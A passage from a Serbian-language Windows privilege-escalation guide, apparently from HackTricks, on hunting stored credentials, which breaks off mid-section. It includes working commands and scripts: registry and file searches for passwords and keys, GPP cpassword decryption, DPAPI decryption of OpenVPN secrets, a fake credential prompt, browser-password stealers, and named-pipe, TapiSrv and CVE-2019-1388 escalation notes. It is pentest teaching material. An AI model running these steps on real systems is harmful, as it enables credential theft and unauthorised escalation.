Solar-PuTTY je zaseban menadžer sesija. Njegova izvorna šifrovana datoteka može se nalaziti na `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok izvezena rezervna kopija sesija može da se zove `sessions-backup.dat` i da bude sačuvana na drugom mestu. [SolarWinds-ovo uputstvo za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i da mogu da sadrže sesije, ključeve, skripte, oznake i veze; njihov [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) navodi gde se nalazi izvorna datoteka. Najpre proverite dozvole i putanje datoteka. Pronalaženje bilo koje od ovih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani akreditivi i dalje važeći ili da imaju veće privilegije.

### PuTTY SSH host ključevi

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u ključu registra `HKCU\Software\OpenSSH\Agent\Keys`, pa proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete neku stavku unutar te putanje, verovatno je reč o sačuvanom SSH ključu. Sačuvan je šifrovan, ali se može lako dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako servis `ssh-agent` nije pokrenut, a želite da se automatski pokreće pri podizanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da napravim SSH ključeve, dodam ih pomoću `ssh-add` i prijavim se na mašinu preko SSH-a. Ključ registra HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije otkrio upotrebu `dpapi.dll` tokom autentifikacije pomoću asimetričnog ključa.

### Datoteke za unattended instalaciju

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove datoteke možete potražiti i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Rezervne kopije SAM & SYSTEM-а

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive rezervne kopije Windows Imaging (`.wim`) mogu da sadrže i offline košnice registra `SAM`, `SECURITY` i `SYSTEM`. Dajte prednost lokalno dostupnim direktorijumima sa rezervnim kopijama ili slikama sistema i pregledajte **nazive članova** slike pre nego što bilo šta izdvojite; samo ime datoteke `.wim` ne dokazuje da su košnice izložene, a uobičajene slike `install.wim`, `boot.wim` i slike za oporavak često su lažni tragovi. SMB deljenje predstavlja zaseban način pristupa i treba ga proveravati samo ako je to deljenje u opsegu. Pogledajte Microsoft smernice za [Windows slike](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu za datoteke košnica registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Akreditivi za cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je postojala funkcija koja je omogućavala primenu prilagođenih lokalnih administratorskih naloga na grupi računara putem Group Policy Preferences (GPP). Međutim, ovaj metod je imao značajne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), koji su bili sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svakom korisniku domena. Drugo, lozinke unutar ovih GPP-ova, šifrovane pomoću AES256 sa javno dokumentovanim podrazumevanim ključem, mogao je da dešifruje svaki autentifikovani korisnik. To je predstavljalo ozbiljan rizik jer je korisnicima moglo da omogući sticanje povišenih privilegija.

Da bi se ovaj rizik ublažio, razvijena je funkcija koja pretražuje lokalno keširane GPP datoteke i traži polje „cpassword“ koje nije prazno. Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, što pomaže u identifikaciji i otklanjanju ove bezbednosne ranjivosti.

Potražite sledeće datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Da biste dešifrovali cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje crackmapexec za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config datoteke sa podacima za autentifikaciju:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup arhive u IIS webroot-u

Stara ZIP rezervna kopija smeštena direktno u webroot-u koji se poslužuje može otkriti prethodne konfiguracione datoteke i ponovo upotrebljive akreditive. Proverite konfigurisanu fizičku putanju sajta i da li je arhivi zaista moguće pristupiti preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` samo je moguća lokacija. Brzi lokalni pregled može da prikaže nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne dokazuje da ona sadrži tajnu niti da pronađeni pristupni podatak omogućava veće privilegije.

### OpenVPN pristupni podaci

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dnevnici

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite akreditive

Uvek možete **zatražiti od korisnika da unese svoje akreditive ili čak akreditive drugog korisnika** ako mislite da ih zna (imajte na umu da je direktno **traženje akreditiva** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koje sadrže pristupne podatke**

Poznate datoteke koje su nekada sadržale **lozinke** u **običnom tekstu** ili Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Varijanta liste naziva datoteka bez ekstenzije Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 baze podataka obično koriste ekstenziju `.psafe3`. Datoteku sa odgovarajućim nazivom tretirajte kao kandidata za šifrovani trezor; njeno prisustvo ne znači da možete da je pročitate, otključate ili upotrebite sačuvane akreditive. Prilikom provere gde su takve datoteke smeštene, pregledajte dostupne korisničke profile i konfigurisane korene deljenih datoteka.

Čitljiv KeePass `.kdbx` je takođe samo trag koji ukazuje na šifrovani trezor. Za otključavanje su potrebni stvarna glavna lozinka i sve konfigurisane faktorske provere putem datoteke ključa ili naloga. Ako ovlašćena provera pronađe par LM:NT hash vrednosti u stavci, proverite navedeni nalog i da li je NT hash aktuelan i prihvaćen na NTLM servisu ciljnog sistema pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Sama stavka u trezoru ne daje prava Administrator ili SYSTEM; mora da postoji i pristup udaljenom servisu, odgovarajuća prava naloga i svaki zaseban korak za izvršavanje servisa. U inventaru treba navesti putanju do trezora i da li je čitljiv, a ne ispisivati bazu podataka ili sačuvane akreditive.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Varijanta komande Search bez ekstenzije Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Akreditivi u korpi za otpatke

Takođe proverite korpu za otpatke i potražite akreditive u njoj.

Proverite dostupne stavke u korpi za otpatke i potražite obrisane rezervne kopije i arhive konfiguracija, kao i datoteke čiji nazivi izričito pominju akreditive. Korisna `.7z`, `.zip` ili `.rar` rezervna kopija može biti stara i po nekoliko meseci, a imati sasvim uobičajen naziv. Windows čuva originalnu putanju i vreme brisanja u zapisu `$I`, a obrisanu datoteku kao odgovarajući unos `$R`; pre otvaranja arhive proverite metapodatke i da li trenutni identitet ima pristup za čitanje. Vidljivost zavisi od volumena, SID-a korisnika i dozvola za datoteke, pa prazan spisak ne dokazuje da ne postoji nijedna rezervna kopija koja se može oporaviti. Naziv arhive smatrajte kandidatom za proveru, a ne dokazom da sadrži važeći tajni podatak.

Dostupna obrisana datoteka `.pfx` može biti i naznaka za **code-signing**. Ako sadrži dostupan privatni ključ, tim ključem može se potpisati izmenjena PowerShell skripta; [PowerShell zahteva sertifikat za potpisivanje koda sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [pravila izdavača u AppLocker-u proveravaju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Izvršavanje na drugom nalogu zahteva da trenutni identitet može da izmeni konkretnu skriptu, da efektivno pravilo prihvata dobijeni potpis za tu skriptu i ciljni nalog, kao i da zakazani zadatak ili drugi proces sa višim privilegijama zaista pokrene skriptu. Sam naziv datoteke `.pfx`, predmet sertifikata ili mogućnost pisanja u skriptu ne dokazuju da su svi ovi uslovi ispunjeni. Pre otvaranja materijala sa privatnim ključem ili pokretanja zadatka proverite metapodatke, ACL-ove, pravila i zakazanu komandu.

Proverite i dostupne baze profila klijenata za razmenu poruka, beleške i primljene datoteke u potrazi za naznakama akreditiva. Izvoz BitLocker ključa za oporavak može biti sačuvan kao HTML ili TXT datoteka, ponekad unutar arhive rezervne kopije sa odgovarajućim nazivom. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu sa starijim rezervnim kopijama; proveravajte volumen i arhivu samo ako imate ovlašćenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, za oporavak akreditiva domene van mreže potreban je i odgovarajući `SYSTEM` hive, kao što je opisano u [toku rada za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sami nazivi datoteka i zaključan volumen ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domene.

Za **oporavak lozinki** sačuvanih u nekoliko programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Drugi mogući ključevi registra sa akreditivima**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Izdvajanje OpenSSH ključeva iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz **Chrome-a ili Firefox-a**.\
Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz **Chrome-a, Edge-a ili Firefox-a**.\
Proverite i istoriju, obeleživače i omiljene stranice pregledača — možda su tamo sačuvane neke **lozinke**.

Za podrazumevani profil `Default` trenutnog korisnika u Edge-u, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok se `Local State` nalazi u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); drugi profil ili politika `UserDataDir` mogu da promene lokaciju. Prisustvo datoteke samo ukazuje na mogući izvor akreditiva: proverite da li su datoteke čitljive, da li imate odgovarajući DPAPI kontekst korisnika ili drugi odobreni materijal ključa i da li sačavljena prijava pripada nalogu sa višim privilegijama. Samo enumerisanje putanja ne mora da otvara bazu podataka niti da ispisuje dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` u profilu uparene datoteke ključa i šifrovanih prijava. Njihovo prisustvo samo ukazuje na mogući izvor: proverite da li su obe datoteke čitljive, da li postoje sačuvani unosi i da li Primary Password štiti ključ pre nego što zaključite da se akreditivi mogu koristiti. Ako pronađeni akreditiv pripada domenskom nalogu, zasebno proverite efektivna prava tog naloga za kontrolu grupa i [LAPS prava za čitanje ili dešifrovanje lozinke](../active-directory-methodology/laps.md) za tu grupu; artefakti pregledača sami po sebi ne ukazuju na put do administratorskih privilegija.

Alati za izdvajanje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta **identifikovana je pomoću class ID (CLSID)**, a svaka komponenta izlaže funkcionalnost putem jednog ili više interfejsa, identifikovanih pomoću interface ID (IID).

COM klase i interfejsi definisani su u registru, u ključevima **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**, tim redosledom. Ovaj registar se kreira spajanjem ključeva **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registra možete pronaći podključ **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja pokazuje na **DLL** i vrednost pod nazivom **ThreadingModel**, koja može biti **Apartment** (jednonitni), **Free** (višenitni), **Both** (jednonitni ili višenitni) ili **Neutral** (nezavisan od niti).

![Istorija pregledača - COM DLL Overwriting: Unutar CLSID-ova ovog registra možete pronaći podključ InProcServer32, koji sadrži podrazumevanu vrednost koja pokazuje na DLL i vrednost...](<../../images/image (729).png>)

U suštini, ako možete da **prepišete neku od DLL datoteka** koje će se izvršavati, mogli biste da **eskalirate privilegije** ako tu DLL datoteku izvršava drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam postojanosti, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u datotekama i registru**

**Pretraga sadržaja datoteka**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Potražite datoteku sa određenim imenom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Potražite nazive ključeva i lozinke u registru**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alati koji traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio da **automatski pokrene svaki metasploit POST modul koji traži akreditive** na žrtvinom sistemu.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve datoteke koje sadrže lozinke pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sesije**, **korisnička imena** i **lozinke** za nekoliko alata koji čuvaju ove podatke u otvorenom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Procureli handle-ovi

Zamislite da **proces koji se izvršava kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **zatim kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali tako da nasleđuje sve otvorene handle-ove glavnog procesa**.\
Zatim, ako imate **puni pristup procesu sa niskim privilegijama**, možete da preuzmete **otvoreni handle do privilegovanog procesa kreiranog** pomoću `OpenProcess()` i **ubacite shellcode**.\
[Pročitajte ovaj primer za više informacija o tome **kako otkriti i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte i [**ovu objavu**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) za potpunije objašnjenje kako testirati i zloupotrebiti više otvorenih handle-ova procesa i niti nasleđenih sa različitim nivoima dozvola (ne samo punim pristupom).](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonacija klijenta Named Pipe-a

Segmenti deljene memorije, koji se nazivaju **pipe-ovi**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo je slično arhitekturi klijent/server, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada **klijent** pošalje podatke kroz pipe, **server** koji je uspostavio pipe može da **preuzme identitet** **klijenta**, pod uslovom da ima potrebna prava **SeImpersonate**. Ako identifikujete **privilegovani proces** koji komunicira preko pipe-a koji možete da oponašate, možete **steći veće privilegije** tako što ćete preuzeti identitet tog procesa nakon što on stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje takvog napada potražite [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Takođe, sledeći alat omogućava **presretanje komunikacije preko named pipe-a pomoću alata poput Burp-a:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privesc ranjivosti** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Daljinski DWORD upis preko Telephony tapsrv-a do RCE

Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Daljinski autentifikovani klijent može da zloupotrebi asinhroni put događaja zasnovan na mailslot-u i pretvori `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koju postojeću datoteku u koju `NETWORK SERVICE` može da upisuje, a zatim dobije administratorska prava u Telephony-ju i učita proizvoljan DLL kao servis. Ceo postupak:

- `ClientAttach` sa `pszDomainUser` podešenim na postojeću putanju u koju je moguće upisivati → servis je otvara pomoću `CreateFileW(..., OPEN_EXISTING)` i koristi je za asinhroni upis događaja.
- Svaki događaj upisuje napadačev `InitContext` iz `Initialize` u taj handle. Registrujte line app pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite podatke pomoću `GetAsyncEvents` (`Req_Func 0`), a zatim ga odregistrujte/ugasite da biste ponavljali determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa proizvoljnom putanjom DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Razno

### Ekstenzije datoteka koje mogu da izvršavaju sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba Protocol handler-a / ShellExecute-a preko Markdown renderera

Klikabilni Markdown linkovi prosleđeni funkciji `ShellExecuteExW` mogu da pokrenu opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke pod kontrolom napadača kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Nadgledanje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju akreditive kroz komandnu liniju**. Skripta ispod beleži komandne linije procesa svake dve sekunde i poredi trenutno stanje sa prethodnim, ispisujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (preko konzole ili RDP-a) i UAC je omogućen, u nekim verzijama sistema Microsoft Windows moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ iz neprivilegovanog korisničkog naloga.

To omogućava eskalaciju privilegija i istovremeno zaobilaženje UAC-a pomoću iste ranjivosti. Pored toga, nema potrebe da bilo šta instalirate, a binarni fajl koji se koristi tokom procesa potpisao je i izdao Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da bi se iskoristila ova ranjivost, potrebno je izvršiti sledeće korake:

```
